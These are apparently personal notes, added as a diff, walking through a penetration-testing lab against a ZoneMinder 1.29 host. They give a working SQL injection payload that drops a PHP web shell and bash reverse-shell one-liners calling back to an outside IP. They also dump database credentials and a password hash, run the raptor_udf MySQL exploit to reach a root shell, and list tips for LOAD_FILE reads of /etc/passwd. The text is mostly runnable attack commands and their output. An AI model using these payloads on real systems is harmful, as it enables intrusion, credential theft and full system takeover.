@@ -1,0 +1,110 @@
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+searchsploit zoneminder 1.29
+get  41239.txt and learn
+
+2)SQL Injection
+Example Url:http://192.168.241.131/zm/index.php
+Parameter: limit (POST)
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
+    Payload: view=request&request=log&task=query&limit=100;(SELECT *
+FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
+
+use burpsuite with above or below payload both work. 
+view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5
+then adjust it to below:
+view=request&request=log&task=query&limit=100;select "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/rce.php"#
+#&minTime=1466674406.084434
+try at port 80, 8080 no working, known that port 3305 open, try on it!
+http://192.168.124.52:3305/rce.php?cmd=id
+it works.
+url encode bash -c 'bash -i >& /dev/tcp/192.168.45.217/21 0>&1'
+then in url after cmd=
+or use below one liner, use port 21 is because some labs may block port 4444.
+curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.217/21 0>&1'" "<http://192.168.124.52:3305/rce.php>"
+
+find /etc -name "*zm*" 2>/dev/null
+/etc/zm
+/etc/zm/zm.conf
+
+# ZoneMinder database hostname or ip address
+ZM_DB_HOST=localhost
+# ZoneMinder database name
+ZM_DB_NAME=zm
+# ZoneMinder database user
+ZM_DB_USER=root
+# ZoneMinder database password
+ZM_DB_PASS=ShinyLucentMarker361
+when try mysql -u -p system hang. can try this one liner. 
+mysql -u root -pShinyLucentMarker361 zm -e "show tables;"
+$ mysql -u root -pShinyLucentMarker361 zm -e "SELECT * FROM Users;"
+<tml$ mysql -u root -pShinyLucentMarker361 zm -e "SELECT * FROM Users;"      
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Id      Username        Password        Language        Enabled Stream  Events  Control Monitors    Groups  Devices System  MaxBandwidth    MonitorIds
+1       admin   *4ACFE3202A5FF5CF467898FC58AAB1D615029441 
+
+mysql -u root -pShinyLucentMarker361 zm -e "show tables;"
+─$ hashcat --identify '*4acfe3202a5ff5cf467898fc58aab1d615029441'
+No hash-mode matches the structure of the input hash.
+$ hashcat --identify '4acfe3202a5ff5cf467898fc58aab1d615029441' # remove * at beginning and try again. 
+300 | MySQL4.1/MySQL5                                            | Database Server
+4acfe3202a5ff5cf467898fc58aab1d615029441:admin
+But fail to login anything.
+see other walkthrough,
+mysql -u root -p this time successfully get into database.
+
+know the mysql version is 5.7 
+There is a privilege escalation exploit we can abuse for MySql:
+https://www.exploit-db.com/exploits/1518
+
+$ gcc -g -c 1518.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf1.so 1518.o -lc
+use wget upload this raptor_udf1.so to target /tmp
+
+* mysql> use mysql;
+ * mysql> create table foo(line blob);
+ * mysql> insert into foo values(load_file('/tmp/raptor_udf1.so'));
+ * mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf1.so';
+ * mysql> create function do_system returns integer soname 'raptor_udf1.so';
+ * mysql> select * from mysql.func;
+
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf1.so | function |
++-----------+-----+----------------+----------+
+
+ /tmp$ echo "bash -c 'bash -i >& /dev/tcp/192.168.45.217/21 0>&1' " > bash.sh
+ chmod +x bash.sh
+ 
+ kill current reverse shell and use this payload at burpsuite again:
+ view=request&request=log&task=query&limit=100;select do_system('/bin/bash /tmp/bash.sh');#&minTime=1466674406.084434
+ 
+on listener port 21 get a root reverse shell
+root@pebbles:/var/lib/mysql# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+################# ################# ################# ################# ##################################
+Always try the standard Linux web roots first. In 90% of labs, it is one of these:
+/var/www/html/ (Ubuntu/Debian default)
+/var/www/
+/usr/share/nginx/html/ (Nginx default)
+/opt/lampp/htdocs/ (XAMPP/Custom installs)
+
+Fuzz for non-existent files: http://ip/doesnotexist. Sometimes the 404 page says: "File /var/www/html/doesnotexist not found."
+Check phpinfo.php: If you find a phpinfo file via gobuster, it lists the script_filename, which gives you the absolute path.
+Instead of jumping straight to a shell, use your SQLi to try and read a file you know exists.
+Payload: ... UNION SELECT LOAD_FILE('/etc/passwd') --
+If it returns content, you have file-read. Now try reading a web file: ... LOAD_FILE('/var/www/html/index.php'). 
+If that works, you’ve confirmed the path!
+
+find /etc -type f -mtime -100 or grep -ri "db_password". # use mtime to get less noise.
+
